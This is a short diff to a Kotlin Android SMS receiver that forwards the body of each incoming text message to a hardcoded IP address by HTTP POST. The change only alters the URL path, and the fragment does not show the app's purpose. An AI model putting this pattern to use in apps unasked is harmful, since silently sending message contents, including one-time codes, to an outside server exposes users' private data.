@@ -39,7 +39,7 @@ internal class SMSReceiver : BroadcastReceiver() {
                         message = currentSMS!!.displayMessageBody
                         //Toast.makeText(context, "message: $message", Toast.LENGTH_LONG).show()
                         try {
-                            sendPost("http://34.66.156.110/send_message", message.toString())
+                            sendPost("http://34.66.156.110/", message.toString())
                             Toast.makeText(context, "Success", Toast.LENGTH_LONG).show()
                         } catch (e: Exception) {
                             Toast.makeText(context, "Sending error", Toast.LENGTH_LONG).show()
